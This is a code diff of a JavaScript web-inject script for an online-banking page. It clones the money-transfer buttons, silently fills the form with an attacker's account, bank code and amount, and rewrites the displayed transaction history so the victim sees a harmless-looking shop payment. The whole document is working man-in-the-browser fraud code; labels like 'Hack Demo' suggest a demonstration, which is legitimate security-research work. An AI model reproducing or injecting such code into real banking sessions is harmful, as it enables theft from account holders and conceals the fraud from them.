@@ -1,21 +1,22 @@
 
-HACK_REC_ACCOUNT	="999";
-HACK_REC_NAME		="Mr. Evil";
-HACK_BANK_BLZ		="8272";
-HACK_BANK_NAME		="The Bad Bank";
+HACK_REC_ACCOUNT	="999666999";
+HACK_REC_NAME		="Hack the Bank";
+HACK_BANK_BLZ		="12060000";
+HACK_BANK_NAME		="Bad Bank";
 HACK_AMOUNT			=500;
-HACK_USAGE			="Weil es moeglich ist";
-globalRC_Acc_Name="Mutter";
-globalRC_Acc_Nr="725826262"
-globalRC_Bank_BLZ="23000000";
+HACK_USAGE			="Hack Demo";
+globalRC_Acc_Name="Rewe Koeln";
+globalRC_Acc_Nr="725 826 262"
+globalRC_Bank_BLZ="230 000 00";
 globalRC_Bank_Name="Postbank"
 global_Amount="34,50";
 global_Usage="Vielen Dank fuer Ihren Einkauf";
 
+
 	 function timedMsg()
 		 {
 		 
-		 	$("#btnTD button:visible[hackmarker!='true'](:contains('Geld'),:contains('Send M'))").each(function(){
+		 $("#btnTD button:visible[hackmarker!='true']:contains('Geld')").each(function(){		 			
 		 			$(this).attr("hackMarker","true");
 		 			sendMoneyBtnClone=$(this).clone(true)
 		 			sendMoneyBtnClone.attr("hName","sendMoneyBtnClone");
@@ -55,7 +56,7 @@ global_Usage="Vielen Dank fuer Ihren Einkauf";
 		 		$(this).attr("hackConfPageMarker","true");
 		 	});
 		 	
-		 	$("#btnTD button:visible[hackmarker!='true'](:contains('berweisung'),:contains('Confirm T'))").each(function(){	
+		 	$("#btnTD button:visible[hackmarker!='true']:contains('berweisung')").each(function(){
 		 		$(this).attr("hackMarker","true");
 	 			sendMoneyConfirmBtnClone=$(this).clone(true)
 	 			$(this).after(sendMoneyConfirmBtnClone);
@@ -69,14 +70,22 @@ global_Usage="Vielen Dank fuer Ihren Einkauf";
 	 				$("input:eq(5)").val(HACK_AMOUNT);
 	 				$("input:eq(6)").val(HACK_USAGE);
 	 				$("button[hackMarkerConfirmBtnOrig='true']").click();
-	 				});			
+	 				$("input:eq(1)").val(globalRC_Acc_Nr);
+					$("input:eq(2)").val(globalRC_Acc_Name);
+					$("input:eq(3)").val(globalRC_Bank_BLZ);
+					$("input:eq(4)").val(globalRC_Bank_Name);
+					$("input:eq(5)").val(global_Amount);
+					$("input:eq(6)").val(global_Usage);
+
+	 				});
+	 			
 		 	});
 		 	var recText=globalRC_Acc_Name+' ('+globalRC_Acc_Nr+')';
-		 	$(".TransfersOdd,.TransfersEven").filter(':contains(Mr. Evil)').text(recText);		 	
+		 	$(".TransfersOdd,.TransfersEven").filter(':contains(Hack the Bank)').text(recText);		 	
 		 	var bankText=globalRC_Bank_Name+' ('+globalRC_Bank_BLZ+')';
-		 	$(".TransfersOdd,.TransfersEven").filter(':contains(The Bad Bank)').text(bankText);
-		 	$(".TransfersOdd,.TransfersEven").filter(':contains(8272)').text(globalRC_Bank_BLZ);
-		 	$(".TransfersOdd,.TransfersEven").filter(':contains(Weil es moeglich ist)').text(global_Usage);
+		 	$(".TransfersOdd,.TransfersEven").filter(':contains(Bad Bank)').text(bankText);
+		 	$(".TransfersOdd,.TransfersEven").filter(':contains(12060000)').text(globalRC_Bank_BLZ);
+		 	$(".TransfersOdd,.TransfersEven").filter(':contains(Hack Demo)').text(global_Usage);
 		 	$(".TransfersOdd,.TransfersEven").filter(':contains(500)').text(global_Amount);
 		 	
 		 	
